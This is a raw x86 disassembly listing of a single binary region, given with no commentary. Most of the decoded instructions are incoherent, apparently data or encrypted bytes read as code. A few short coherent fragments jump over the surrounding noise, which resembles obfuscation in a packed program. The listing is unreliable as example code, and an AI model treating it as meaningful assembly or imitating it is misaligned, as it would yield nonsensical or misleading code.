  4020cd:	and    ebp,DWORD PTR [edx+edi*2-0x295631e1]
  4020d4:	sbb    bh,cl
  4020d6:	fsub   QWORD PTR [edi-0x76892c7]
  4020dc:	ins    BYTE PTR es:[edi],dx
  4020dd:	sub    DWORD PTR [esi-0x3c],ecx
  4020e0:	inc    ecx
  4020e1:	fs das 
  4020e3:	imul   BYTE PTR [ebx+0x51]
  4020e6:	dec    edx
  4020e7:	push   ds
  4020e8:	ds adc al,0xea
  4020eb:	and    dh,BYTE PTR [ebp-0x5]
  4020ee:	into   
  4020ef:	or     eax,0x50bfff5f
  4020f4:	mov    ds:0x8e9847a8,eax
  4020f9:	stos   BYTE PTR es:[edi],al
  4020fa:	sbb    DWORD PTR [edi+0x12585424],ebx
  402100:	leave  
  402101:	lar    ecx,WORD PTR [ebx+eiz*1-0x28]
  402106:	inc    edi
  402107:	sub    bl,BYTE PTR [ebp+0x36ad1165]
  40210d:	ret    
  40210e:	dec    eax
  40210f:	sub    edx,esi
  402111:	out    dx,al
  402112:	sbb    ch,BYTE PTR [eax+0x16]
  402115:	ror    DWORD PTR [di+0x33],0x56
  40211a:	cmp    DWORD PTR [esi],edi
  40211c:	mov    bh,0x2c
  40211e:	mov    ds:0x1e04e5aa,eax
  402123:	mov    al,ds:0x5eba6985
  402128:	imul   ebp,DWORD PTR [esi],0x8f835513
  40212e:	gs add eax,0x8e70b1d5
  402134:	iret   
  402135:	cs push ebp
  402137:	xlat   BYTE PTR ds:[ebx]
  402138:	push   ds
  402139:	mov    ecx,0x62d0432d
  40213e:	sub    al,0xf4
  402140:	fsub   DWORD PTR ds:0x86c954a8
  402146:	xor    al,0x14
  402148:	inc    esp
  402149:	xchg   BYTE PTR [ebx-0x7c],bl
  40214c:	jge    0x40215a
  40214e:	sbb    al,BYTE PTR [edi+edx*2-0x21034f8b]
  402155:	stc    
  402156:	xchg   BYTE PTR [ecx],bh
  402158:	shl    DWORD PTR [edx],1
  40215a:	scas   al,BYTE PTR es:[edi]
  40215b:	cmp    dl,cl
  40215d:	fstp   QWORD PTR [esi+0x2e]
  402160:	push   0x7
  402162:	fidiv  DWORD PTR [esi-0x64]
  402165:	dec    ebx
  402166:	ins    BYTE PTR es:[edi],dx
  402167:	cmp    edi,DWORD PTR [ebx]
  402169:	and    BYTE PTR [edx+0x31f627c4],al
  40216f:	mov    cl,0x12
  402171:	mov    BYTE PTR ds:0x5eff7622,dh
  402177:	sbb    dh,al
  402179:	gs aad 0x4b
  40217c:	lahf   
  40217d:	aad    0x92
  40217f:	retf   0xfee6
  402182:	push   eax
  402183:	aas    
  402184:	push   ebx
  402185:	(bad)  
  402186:	out    dx,eax
  402187:	jecxz  0x4021fb
  402189:	push   ecx
  40218a:	push   es
  40218b:	mov    bl,0xd0
  40218d:	fdivrp st(0),st
  40218f:	enterw 0xf6d9,0xde
  402194:	imul   esi,DWORD PTR ds:0xfef4047d,0x7dfc86d6
  40219e:	popf   
  40219f:	shl    DWORD PTR ds:[eax-0x6b],0x9a
  4021a4:	aad    0xef
  4021a6:	pop    ecx
  4021a7:	ret    0xf559
  4021aa:	arpl   ax,ax
  4021ac:	in     eax,0xa0
  4021ae:	xlat   BYTE PTR ds:[ebx]
  4021af:	push   ebp
  4021b0:	add    esi,ebp
  4021b2:	out    dx,al
  4021b3:	loope  0x402188
  4021b5:	pop    eax
  4021b6:	mov    edi,0xec1b1603
  4021bb:	leave  
  4021bc:	jmp    0xdcf2:0x8455e7f9
  4021c3:	xchg   edi,eax
  4021c4:	and    BYTE PTR [ecx+0x424ff193],dh
  4021ca:	and    BYTE PTR [esi+eiz*2+0x1a11c75c],al
  4021d1:	(bad)  
  4021d2:	retf   0x9fe9
  4021d5:	pusha  
  4021d6:	popf   
  4021d7:	mov    bl,bl
  4021d9:	and    al,0x6
  4021db:	in     al,0x4b
  4021dd:	repz push edi
  4021df:	cmp    ch,BYTE PTR [eax+ebx*1]
  4021e2:	pop    edx
  4021e3:	xor    eax,ecx
  4021e5:	ins    DWORD PTR es:[edi],dx
  4021e6:	ret    
  4021e7:	outs   dx,DWORD PTR ds:[esi]
  4021e8:	clc    
  4021e9:	adc    ch,BYTE PTR [esi]
  4021eb:	in     eax,dx
  4021ec:	mov    esp,0xbc6aa3f9
  4021f1:	xchg   ebp,eax
  4021f2:	in     eax,0x69
  4021f4:	or     eax,0x4ee8c746
  4021f9:	add    BYTE PTR [ecx+0x343cc38a],al
  4021ff:	add    al,0xf9
  402201:	dec    edi
  402202:	cs mov bh,0x90
  402205:	clc    
  402206:	retf   0x8380
  402209:	cli    
  40220a:	mov    edx,0x3f5f77aa
  40220f:	pop    esp
  402210:	cld    
  402211:	(bad)  
  402212:	jmp    0x402247
  402214:	loope  0x4021f9
  402216:	scas   al,BYTE PTR es:[edi]
  402217:	xchg   esp,eax
  402218:	pop    edi
  402219:	sub    bl,BYTE PTR [ebp-0x790557a8]
  40221f:	gs loopne 0x402298
  402222:	cld    
  402223:	inc    edi
  402224:	cmp    ch,ah
  402226:	or     al,0xce
  402228:	das    
  402229:	push   0x6f2a1494
  40222e:	sbb    BYTE PTR [eax-0x15],0x93
  402232:	mov    WORD PTR [esi],fs
  402234:	mov    al,ds:0x6e4e8abd
  402239:	fisub  DWORD PTR [edx]
  40223b:	ds pop edi
  40223d:	in     al,0xbe
  40223f:	or     BYTE PTR [ebx+0x63],dl
  402242:	dec    ecx
  402243:	adc    bh,0xbd
  402246:	and    BYTE PTR [ebp+0x29],0xbe
  40224a:	push   es
  40224b:	div    DWORD PTR [ecx+0x4d8bc69d]
  402251:	or     al,0x33
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi-0x7b6d82bc],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402306
  4022a2:	mov    dh,0x16
  4022a4:	sbb    BYTE PTR ds:0xa7edd6e3,bl
  4022aa:	push   esp
  4022ab:	xchg   esi,eax
  4022ac:	push   0x2c239b5
  4022b1:	jbe    0x402306
  4022b3:	mov    WORD PTR [edx+0x1d],ds
  4022b6:	bound  esp,QWORD PTR [esi]
  4022b8:	pop    es
  4022b9:	lods   al,BYTE PTR ds:[esi]
  4022ba:	jge    0x402338
  4022bc:	(bad)  
  4022bd:	jae    0x402267
  4022bf:	inc    ebx
  4022c0:	paddsw mm3,QWORD PTR [edx-0x3e05194a]
  4022c7:	ins    DWORD PTR es:[edi],dx
  4022c8:	cmc    
  4022c9:	or     esi,esp
  4022cb:	inc    esi
  4022cc:	and    ch,BYTE PTR [ecx-0x24]
  4022cf:	(bad)  
  4022d0:	xlat   BYTE PTR ds:[ebx]
  4022d1:	jo     0x40229c
  4022d3:	popa   
  4022d4:	loopne 0x4022ff
  4022d6:	cld    
  4022d7:	dec    ebx
  4022d8:	hlt    
  4022d9:	out    0x6a,al
  4022db:	stos   DWORD PTR es:[edi],eax
  4022dc:	xor    BYTE PTR [eax-0x3390f92e],dl
  4022e2:	push   ss
  4022e3:	or     DWORD PTR ds:0xa61c16f3,ecx
  4022e9:	imul   edx,edx,0x685a8fe
  4022ef:	and    esi,DWORD PTR [ebx-0x76d278ee]
  4022f5:	sbb    al,0x54
  4022f7:	xor    eax,0x4a60153b
  4022fc:	addr16 ss mov esi,0x56d434ca
  402303:	je     0x402340
  402305:	aad    0xd7
  402307:	mov    al,0xd0
  402309:	add    eax,0x3b739e03
  40230e:	push   ss
  40230f:	cwde   
  402310:	push   ss
  402311:	push   es
  402312:	lods   eax,DWORD PTR ds:[esi]
  402313:	mov    ?,ebp
  402315:	ins    BYTE PTR es:[edi],dx
  402316:	push   ebp
  402317:	fld    DWORD PTR [ebx-0x3c]
  40231a:	fcomp  QWORD PTR [ebx+eax*1]
  40231d:	or     BYTE PTR [ecx+0x55],dl
  402320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402321:	adc    BYTE PTR [edx+ebx*2-0x5e],0x7d
  402326:	sbb    DWORD PTR [ebx+edi*2-0x66acd08e],esi
  40232d:	ins    BYTE PTR es:[edi],dx
  40232e:	add    eax,0x24c45d40
  402333:	(bad)  
  402334:	and    cl,BYTE PTR [edi+ecx*8]
  402337:	imul   edx,DWORD PTR [eax+0x2d],0xffffff8b
  40233b:	pop    esi
  40233c:	bound  edi,QWORD PTR [ebx]
  40233e:	sub    al,0x5d
  402340:	xchg   ecx,eax
  402341:	dec    esi
  402342:	sbb    al,0x4b
  402344:	aas    
  402345:	lods   al,BYTE PTR ds:[esi]
  402346:	add    DWORD PTR [ebx-0x694a37e0],edx
  40234c:	push   0x4fac31ac
  402351:	in     eax,dx
  402352:	les    edi,FWORD PTR [edx+esi*8+0x975278c]
  402359:	push   ebx
  40235a:	add    edx,ebp
  40235c:	sahf   
  40235d:	mov    ds:0x35003c53,al
  402362:	jno    0x40231a
  402364:	xchg   edi,eax
  402365:	cmp    al,0xa3
  402367:	jmp    0x3f09f226
  40236c:	xchg   edx,eax
  40236d:	in     al,0xa2
  40236f:	ins    DWORD PTR es:[edi],dx
  402370:	jns    0x4023d7
  402372:	pop    eax
  402373:	aad    0x83
  402375:	xchg   edx,eax
  402376:	out    dx,eax
  402377:	popf   
  402378:	mov    eax,0x4ba1d4b1
  40237d:	out    dx,eax
  40237e:	ss dec eax
  402380:	jb     0x402342
  402382:	fs lahf 
  402384:	inc    BYTE PTR [esi+0x20aa5713]
  40238a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40238b:	cmp    DWORD PTR [ebx+ebx*4+0x3084f5c1],edx
  402392:	test   eax,0x4a577f40
  402397:	or     eax,0x1baa04d2
  40239c:	xchg   ecx,eax
  40239d:	mov    ch,0xde
  40239f:	fcom   QWORD PTR ds:0xcc7acea9
  4023a5:	(bad)  
  4023a6:	mov    edx,0xbdf92a29
  4023ab:	shl    bl,1
  4023ad:	mov    dh,0x76
  4023af:	sub    eax,0x6a661b5c
  4023b4:	dec    edi
  4023b5:	mov    BYTE PTR [eax],ah
  4023b7:	cs xchg edx,eax
  4023b9:	inc    edi
  4023ba:	in     eax,0x42
  4023bc:	push   esp
  4023bd:	jmp    0x13f6:0x4b50ad0f
  4023c4:	retf   0xb5b8
  4023c7:	(bad)  
  4023c8:	ret    0x6135
  4023cb:	xor    al,0x7
  4023cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ce:	cld    
  4023cf:	jg     0x402387
  4023d1:	sub    BYTE PTR [ecx+ebp*1+0x41],cl
  4023d5:	dec    ebx
  4023d6:	push   ebp
  4023d7:	add    al,0x96
  4023d9:	jns    0x4023d1
  4023db:	or     al,0x37
  4023dd:	jbe    0x402454
  4023df:	push   es
  4023e0:	outs   dx,DWORD PTR ds:[esi]
  4023e1:	jne    0x4023af
  4023e3:	sub    eax,DWORD PTR [edi+ebx*8+0x6e4acaf]
  4023ea:	push   cs
  4023eb:	dec    edi
  4023ec:	pusha  
  4023ed:	mov    ah,0xff
  4023ef:	call   0xd2eb:0xfe43b37a
  4023f6:	adc    eax,0x13f54aa4
  4023fb:	sub    ch,BYTE PTR [ebx-0x69]
  4023fe:	jg     0x402438
  402400:	fld    st(2)
  402402:	(bad)  
  402403:	xlat   BYTE PTR ds:[ebx]
  402404:	cmp    BYTE PTR [esi+0x7f],cl
  402407:	jmp    0x17bdb5f7
  40240c:	xchg   esi,eax
  40240d:	cmp    BYTE PTR cs:[ebx+0x2d3c8f52],bl
  402414:	push   edi
  402415:	or     edi,DWORD PTR [ecx-0x3c]
  402418:	loop   0x40248d
  40241a:	ret    
  40241b:	inc    ah
  40241d:	loopne 0x40242d
  40241f:	loope  0x402429
  402421:	leave  
  402422:	scas   eax,DWORD PTR es:[edi]
  402423:	rcl    BYTE PTR [eax+0x79],1
  402426:	cmp    DWORD PTR [ecx],ebx
  402428:	out    0x36,eax
  40242a:	jl     0x402408
  40242c:	and    eax,0xf6b99a67
  402431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402432:	mov    bl,0x66
  402434:	sub    eax,0x780ef61a
  402439:	sub    al,0xae
  40243b:	push   ebx
  40243c:	jge    0x402466
  40243e:	push   ebp
  40243f:	cmp    BYTE PTR [edi],0x33
  402442:	pop    ds
  402443:	sub    DWORD PTR [eax-0x27dc7303],0x9df521dc
  40244d:	mov    edx,0xf6bc0d6f
  402452:	scas   al,BYTE PTR es:[edi]
  402453:	cmp    ch,bh
  402455:	jg     0x402467
  402457:	popf   
  402458:	in     al,dx
  402459:	ret    
  40245a:	iret   
  40245b:	pop    edi
  40245c:	lds    ebp,FWORD PTR [esi+esi*4]
  40245f:	add    DWORD PTR [eax+0x6b],0x2b
  402463:	dec    esi
  402464:	cld    
  402465:	ror    BYTE PTR [edi+0x16],cl
  402468:	cli    
  402469:	dec    ebp
  40246a:	fs push cs
  40246c:	push   ss
  40246d:	pop    ecx
  40246e:	mov    dh,0x66
  402470:	jmp    0x402412
  402472:	cmp    ch,BYTE PTR [ecx+0x3b]
  402475:	sub    al,0xeb
  402477:	inc    edi
  402478:	mov    bh,0x22
  40247a:	fidiv  DWORD PTR [esi+eiz*8]
  40247d:	int3   
  40247e:	dec    edi
  40247f:	nop
  402480:	frstor [edi-0x34ba6d73]
  402486:	lock fadd st,st(1)
  402489:	scas   eax,DWORD PTR es:[edi]
  40248a:	mov    dh,0xfc
  40248c:	ins    BYTE PTR es:[edi],dx
  40248d:	push   ecx
  40248e:	out    dx,eax
  40248f:	push   esp
  402490:	adc    bh,BYTE PTR [ecx]
  402492:	inc    BYTE PTR [ecx-0x33930d67]
  402498:	jmp    0xfe3d:0xe1aae329
  40249f:	xchg   edi,eax
  4024a0:	in     eax,0x50
  4024a2:	adc    DWORD PTR [esp+eiz*4-0x68ae9e06],ecx
  4024a9:	sbb    BYTE PTR [eax+ecx*2-0x53],0xa1
  4024ae:	aad    0x5c
  4024b0:	js     0x402514
  4024b2:	call   0xd1cd:0xc14419b7
  4024b9:	dec    DWORD PTR [edi+ebx*8-0x47ff9e79]
  4024c0:	sbb    DWORD PTR [esi-0x1c],eax
  4024c3:	fucom  st(1)
  4024c5:	xor    ah,BYTE PTR ds:0x6e12e41e
  4024cb:	or     al,0x98
  4024cd:	cmp    eax,0x3f8c5919
  4024d2:	gs add al,0xae
  4024d5:	lds    edx,FWORD PTR [ebp+edx*1-0x344949b6]
  4024dc:	repnz hlt 
  4024de:	fld    TBYTE PTR [esp+edi*2-0x6d]
  4024e2:	fbstp  TBYTE PTR [edx+0x30]
  4024e5:	fld    DWORD PTR [ecx+ecx*8-0x30]
  4024e9:	enter  0xaba3,0x6b
  4024ed:	loope  0x4024e7
  4024ef:	jo     0x40252f
  4024f1:	cmp    al,0x32
  4024f4:	pop    DWORD PTR [edx]
  4024f6:	xor    cl,bl
  4024f8:	and    DWORD PTR [edi-0x69aaab32],esp
  4024fe:	sbb    al,0x48
  402500:	into   
  402501:	aas    
  402502:	inc    BYTE PTR [ecx]
  402504:	clc    
  402505:	or     al,0x71
  402507:	lahf   
  402508:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40250a:	jae    0x4024d7
  40250c:	add    al,0x78
  40250e:	mov    BYTE PTR [ecx+0x5649b483],bh
  402514:	inc    ebx
  402515:	loope  0x402540
  402517:	imul   BYTE PTR [edx-0x1f65ac0e]
  40251d:	fistp  DWORD PTR [eax+0x7df197e7]
  402523:	dec    esp
  402524:	mov    al,0xf3
  402526:	and    edi,DWORD PTR [edi]
  402528:	je     0x4024c8
  40252a:	rcl    BYTE PTR [ecx-0xc368291],0xad
  402531:	test   eax,0x91965edf
  402536:	ss mov dh,0x5c
  402539:	rol    BYTE PTR [ecx+0x4e],cl
  40253c:	shl    BYTE PTR [esi-0xe],1
  40253f:	xchg   edi,ebx
  402541:	mov    ch,0x34
  402543:	adc    ah,BYTE PTR ss:[eax-0x445dc755]
  40254a:	cmp    DWORD PTR [eax+0x5e],esi
  40254d:	dec    ebx
  40254e:	loope  0x402599
  402550:	hlt    
  402551:	sahf   
  402552:	dec    esp
  402553:	xchg   esp,eax
  402554:	add    DWORD PTR [edx+ecx*2+0x34],ecx
  402558:	or     BYTE PTR [edx-0x20fe7c0a],bh
  40255e:	mov    ebx,0x64873538
  402563:	cmp    DWORD PTR [ecx+0x8eb98b3],0xffffffba
  40256a:	adc    BYTE PTR [ecx-0x325b49d6],0x93
  402571:	or     BYTE PTR [ebx+0x60b824c9],dl
  402577:	jmp    0x40252f
  402579:	jmp    0x4025ba
  40257b:	nop
  40257c:	xchg   esi,eax
  40257d:	mov    ebx,0x31653f55
  402582:	xchg   edx,eax
  402583:	pop    ds
  402584:	jle    0x4025c6
  402586:	pushf  
  402587:	mov    ebx,0xc63316f6
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	push   eax
  4025ae:	call   FWORD PTR [esi]
  4025b0:	arpl   dx,bp
  4025b2:	(bad)  
  4025b4:	jl     0x40261d
  4025b6:	jle    0x402634
  4025b8:	jl     0x4025e5
  4025ba:	inc    BYTE PTR [ebx+edx*1+0x179ef47d]
  4025c1:	push   esi
  4025c2:	std    
  4025c3:	ret    
  4025c4:	jno    0x40255e
  4025c6:	xor    DWORD PTR [ebp+0x62a92203],edi
  4025cc:	mov    eax,ss:0xd9903bb2
  4025d2:	xchg   ecx,eax
  4025d3:	outs   dx,BYTE PTR gs:[esi]
  4025d5:	out    0xcd,al
  4025d7:	sub    eax,0xcbd2f99b
  4025dc:	(bad)  
  4025dd:	push   0x14
  4025df:	cmp    cl,bl
  4025e1:	das    
  4025e2:	mov    cl,0x49
  4025e4:	add    BYTE PTR [edi-0x3c],dh
  4025e7:	cmp    BYTE PTR [esi+0x42],ch
  4025ea:	push   edx
  4025eb:	call   0x610:0xe3d7df88
  4025f2:	test   BYTE PTR [ebx],ah
  4025f4:	inc    ebp
  4025f5:	mov    ebx,DWORD PTR [edi]
  4025f7:	(bad)  
  4025f8:	ror    DWORD PTR [ecx-0x55],1
  4025fb:	inc    ebp
  4025fc:	sub    al,bh
  4025fe:	push   eax
  4025ff:	stos   BYTE PTR es:[edi],al
  402600:	sbb    eax,0x91245afe
  402605:	pop    esi
  402606:	push   ebp
  402607:	mov    esi,edx
  402609:	outs   dx,DWORD PTR ds:[esi]
  40260a:	test   cl,0x28
  40260d:	shl    BYTE PTR [esi-0x77de08a3],cl
  402613:	bnd ret 0x9830
  402617:	ds vpcmpgtb xmm1,xmm2,xmm6
  40261c:	sbb    eax,DWORD PTR [edx]
  40261e:	enter  0x11d8,0xb8
  402622:	mov    esp,eax
  402624:	xchg   DWORD PTR [edi-0x3a0fb465],eax
  40262a:	add    al,0xdf
  40262c:	mov    DWORD PTR ds:[edi-0x5f3e3ce7],ecx
  402633:	cmp    al,0x7a
  402635:	cmc    
  402636:	scas   eax,DWORD PTR es:[edi]
  402637:	or     DWORD PTR [edx+0x46818597],edi
  40263d:	shl    BYTE PTR [ecx],0xea
  402640:	int    0x29
  402642:	mov    cl,0x75
  402644:	aam    0xd
  402646:	cmp    eax,0x423e6c00
  40264b:	gs push 0xb7fcf587
  402651:	popf   
  402652:	push   es
  402653:	push   ecx
  402654:	xlat   BYTE PTR ds:[ebx]
  402655:	mov    eax,0xde2413bc
  40265a:	cmp    eax,0x603579e4
  40265f:	(bad)  
  402660:	js     0x4026dc
  402662:	out    0xa7,eax
  402664:	adc    al,0xfc
  402666:	sbb    al,0xb0
  402668:	cmp    edx,edi
  40266a:	daa    
  40266b:	adc    edx,DWORD PTR [edx+0x70]
  40266e:	jns    0x40264a
  402670:	xor    esi,DWORD PTR [ebx+0x58d5fe57]
  402676:	call   0xd153:0x9f27a427
  40267d:	xchg   ebp,eax
  40267e:	shl    BYTE PTR [eax-0x4a],1
  402681:	adc    dh,BYTE PTR [eax]
  402683:	icebp  
  402684:	fcmove st,st(6)
  402686:	cmp    DWORD PTR [edx+esi*2-0x1a37cbb8],ebp
  40268d:	jge    0x4026d4
  40268f:	sbb    al,0x6d
  402691:	arpl   bx,si
  402693:	jnp    0x40263d
  402695:	jo     0x402653
  402697:	out    dx,al
  402698:	call   0x1241:0xa716623a
  40269f:	pop    edx
  4026a0:	inc    edi
  4026a1:	jge    0x402657
  4026a3:	call   0x4baf7af1
  4026a8:	pop    esi
  4026a9:	call   0xc86c278c
  4026ae:	scas   al,BYTE PTR es:[edi]
  4026af:	addr16 (bad) 
  4026b1:	shl    BYTE PTR [edi+ecx*1-0x60],0xb0
  4026b6:	stc    
  4026b7:	cs cwde 
  4026b9:	cld    
  4026ba:	fisttp DWORD PTR [esi-0x7d]
  4026bd:	cmp    BYTE PTR [esi],ah
  4026bf:	cmp    ecx,DWORD PTR [edx+0x35]
  4026c2:	nop
  4026c3:	push   0x11
  4026c5:	or     DWORD PTR [ebp+esi*8+0x53],esi
  4026c9:	mov    cl,0x5e
  4026cb:	cmp    BYTE PTR [esi],dh
  4026cd:	je     0x4026de
  4026cf:	mov    ebp,0x82391da7
  4026d4:	push   ebp
  4026d5:	sar    DWORD PTR [ebp+0x3265fea6],cl
  4026db:	push   es
  4026dc:	or     eax,ecx
  4026de:	jno    0x4026b0
  4026e0:	pop    eax
  4026e1:	and    eax,0x70cf007c
  4026e6:	jns    0x4026a9
  4026e8:	mov    ebp,DWORD PTR [eax+0x0]
  4026eb:	outs   dx,BYTE PTR ds:[esi]
  4026ec:	jmp    0x40268a
  4026ee:	xchg   BYTE PTR [ebx+eiz*4-0x19255c88],bh
  4026f5:	pop    ecx
  4026f6:	add    al,0x1f
  4026f8:	mov    ds:0xb39d326c,eax
  4026fd:	loope  0x4026e1
  4026ff:	jae    0x4026e1
  402701:	inc    ebp
  402702:	js     0x402770
  402704:	fwait
  402705:	ins    DWORD PTR es:[edi],dx
  402706:	jg     0x4026cf
  402708:	xlat   BYTE PTR ds:[ebx]
  402709:	xor    al,0xc3
  40270b:	aaa    
  40270c:	sbb    al,BYTE PTR [ebp-0x22389bfb]
  402712:	hlt    
  402713:	xchg   ebp,eax
  402714:	push   ebx
  402715:	xor    bl,ah
  402717:	mov    eax,0xef81768a
  40271c:	outs   dx,DWORD PTR ds:[esi]
  40271d:	cld    
  40271e:	and    DWORD PTR [ecx+0x27],eax
  402721:	call   0x3f77987f
  402726:	call   0x9738:0xe2db920c
  40272d:	es call 0xc457:0x77c9cd4f
  402735:	ror    edx,cl
  402737:	push   edx
  402738:	les    edx,FWORD PTR [ebp+0x9]
  40273b:	push   ebx
  40273c:	fs es inc ebp
  40273f:	daa    
  402740:	std    
  402741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402742:	mov    dl,ch
  402744:	stos   DWORD PTR es:[edi],eax
  402745:	das    
  402746:	xchg   ecx,eax
  402747:	add    bl,ah
  402749:	stos   DWORD PTR es:[edi],eax
  40274a:	fidivr DWORD PTR [esi-0x25]
  40274d:	cmp    al,0x49
  40274f:	mov    ebp,0x8097918a
  402754:	(bad)  
  402755:	pusha  
  402756:	pop    esp
  402757:	mov    ebp,0x127b7920
  40275c:	imul   ebx,ebp,0xffffffc7
  40275f:	adc    DWORD PTR [edx+esi*8+0x5d],ebx
  402763:	pop    ecx
  402764:	test   al,0xe8
  402766:	xchg   edx,eax
  402767:	fldl2e 
  402769:	mov    DWORD PTR [esi+0xa],edx
  40276c:	sbb    al,BYTE PTR [ecx-0x7ddd19aa]
  402772:	push   cs
  402773:	adc    eax,0x62dca2fa
  402778:	test   BYTE PTR [edi],ah
  40277a:	push   esp
  40277b:	or     dh,BYTE PTR fs:[ecx]
  40277e:	xchg   edi,eax
  40277f:	jmp    0x9065:0x70e9ae4d
  402786:	jmp    0xe8484899
  40278b:	adc    al,0xe4
  40278d:	sbb    cl,BYTE PTR [esi+0xd]
  402790:	dec    ebx
  402791:	mov    ch,0x48
  402793:	mov    ss,esp
  402795:	call   0x3f9d41fc
  40279a:	test   DWORD PTR [ebx],edi
  40279c:	cdq    
  40279d:	pop    esi
  40279e:	pop    esp
  40279f:	mov    ebp,0x3877b23d
  4027a4:	je     0x4027eb
  4027a6:	dec    esi
  4027a7:	and    bl,al
  4027a9:	imul   esi,DWORD PTR [esi+0x451a9774],0x4e388940
  4027b3:	mov    edi,0x8189bc7b
  4027b8:	jno    0x4027d2
  4027ba:	or     DWORD PTR [ecx-0x51],esp
  4027bd:	test   al,0xed
  4027bf:	and    BYTE PTR [esi],bh
  4027c1:	jmp    0x71d0e0aa
  4027c6:	sbb    bl,dl
  4027c8:	inc    esi
  4027c9:	mov    ch,0x7d
  4027cb:	aam    0x1d
  4027cd:	inc    esp
  4027ce:	dec    ebx
  4027cf:	ds mov dl,0xa5
  4027d2:	aaa    
  4027d3:	lahf   
  4027d4:	fnstenv ds:0xaa3372a2
  4027da:	mov    ebp,0x2d7d2779
  4027df:	into   
  4027e0:	cmp    DWORD PTR [edi],esp
  4027e2:	(bad)  
  4027e3:	fwait
  4027e4:	mov    dl,0x89
  4027e6:	mov    eax,ds:0xcc043b64
  4027eb:	fisubr DWORD PTR ds:0xac7bf9f5
  4027f1:	jmp    0xb2c8e466
  4027f6:	xchg   DWORD PTR [ecx+0x7],ebp
  4027f9:	jns    0x4027e0
  4027fb:	ds (bad) 
  4027fe:	inc    ebx
  4027ff:	push   esi
  402800:	or     esp,esi
  402802:	jb     0x402812
  402804:	les    esi,FWORD PTR [ebx+0x1d]
  402807:	loopne 0x4027f0
  402809:	mov    eax,ds:0x2df7116
  40280e:	add    al,BYTE PTR [edx+0x12]
  402811:	adc    al,0x32
  402813:	or     al,BYTE PTR [eax]
  402815:	in     eax,0xef
  402817:	mov    ds:0x1a5f3f1e,al
  40281c:	rol    DWORD PTR [ecx+eiz*1],0x79
  402820:	faddp  st(6),st
  402822:	xor    DWORD PTR [edx],ebx
  402824:	and    bl,dl
  402826:	xchg   esi,eax
  402827:	lods   al,BYTE PTR ds:[esi]
  402828:	ins    DWORD PTR es:[edi],dx
  402829:	or     DWORD PTR [edi-0x80],edx
  40282c:	outs   dx,DWORD PTR ds:[esi]
  40282d:	into   
  40282e:	or     bh,cl
  402830:	hlt    
  402831:	push   esi
  402832:	xchg   esp,eax
  402833:	loope  0x4028b2
  402835:	lock mov bh,0x25
  402838:	clc    
  402839:	jle    0x4027f5
  40283b:	icebp  
  40283c:	cs sbb al,0xbf
  40283f:	inc    ebp
  402840:	or     edx,DWORD PTR [ebx]
  402842:	(bad)  
  402843:	frstor [ecx]
  402845:	mov    es,WORD PTR [eax+0x4a]
  402848:	imul   ebx,DWORD PTR [edi+0x181e7ec0],0x16d833cb
  402852:	pop    ss
  402853:	shr    DWORD PTR [ebx+0x59aee453],0x59
  40285a:	test   BYTE PTR [edi],0x8
  40285d:	fnsave [esi-0x5e]
  402860:	push   ds
  402861:	std    
  402862:	ins    DWORD PTR es:[edi],dx
  402863:	and    ecx,DWORD PTR [eax-0x21b02df]
  402869:	repz jge 0x402855
  40286c:	mov    al,0xcc
  40286e:	sbb    bl,BYTE PTR [edi-0x3b41ad7b]
  402874:	cmp    edi,DWORD PTR [eax]
  402876:	pop    ds
  402877:	sbb    eax,0xe8ece353
  40287c:	nop
  40287d:	fcmovne st,st(5)
  40287f:	sbb    DWORD PTR [esi-0x1551c412],edx
  402885:	clc    
  402886:	loop   0x4028ad
  402888:	mov    BYTE PTR [ebx+0xbdc5ed1],bh
  40288e:	jae    0x402894
  402890:	lock imul eax,DWORD PTR [eax],0xc11268f
  402897:	push   ebp
  402898:	jno    0x402886
  40289a:	jle    0x4028c5
  40289c:	sahf   
  40289d:	jp     0x4028f9
  40289f:	mov    esi,0x840f2f58
  4028a4:	push   cs
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [ebx+0xc7f845],cl
  4028ad:	lea    ebx,[esi]
  4028af:	xor    al,0x60
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	push   DWORD PTR [eax+0x8dd537f]
